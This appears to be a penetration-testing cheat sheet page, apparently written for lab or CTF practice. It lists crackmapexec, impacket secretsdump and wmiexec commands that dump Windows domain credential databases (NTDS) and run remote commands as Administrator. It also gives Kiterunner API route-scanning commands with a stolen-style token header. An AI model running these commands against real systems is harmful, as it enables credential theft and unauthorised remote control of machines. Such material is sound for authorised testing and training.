---
layout: default
title: Command References & Examples
has_children: false
parent: Resources
nav_order: 5-2
---

# Secure Copy (scp)
- Replace a destination file (Using a SSH public key):
```scp -i id_rsa SomeLocalFile  user@192.168.150.100:directory/someLocalFile```
> If output is not allowed, set the legacy '-O' flag

# Windows
## crackmapexec
> SMB to obtain ntds file:
``` crackmapexec smb forest.example.local -u 'username' -p 'password' --ntds ```
> SMB to pass through a command:
``` crackmapexec smb 192.168.243.248 -u 'Administrator' -p 'Password' -x 'type C:\Users\Administrator\Desktop\proof.txt' ```

## impacket
### secretsdump module
``` impacket-secretsdump -just-dc htb.local/svc-account@10.10.10.161 ```
### wmiexec
``` impacket-wmiexec Administrator@$192.168.243.248 ```

# API Discovery
## Kiterunner
``` kr scan http://192.168.1.150:8888 -w /usr/share/wordlists/kiterunner/routes-large.kite ```
> scan without an authorization header
Options:
``` --fail-status-codes 400,401,404,403,501,502,426,411 ```
``` --delay 1s ```
Add an API Key:
``` kr scan http://10.0.2.4:8090 -w ~/usr/share/wordlists/kiterunner/routes-large.kite -H 'x-access-token: eyJH.eyJ1c.A1c' ```
> -H is 'headers' which passes the API key through in the x-access-token header
Proxy a replay through BurpSuite
```kr kb replay -w ~/usr/share//wordlists/kiterunner/routes-large.kite --proxy http://127.0.0.1:8080 "GET     200 [     10,    1,   1] http://10.0.2.4:8090/api/pictures/like 0cf684adc03406c50be603cfbc094373880973ae" ```


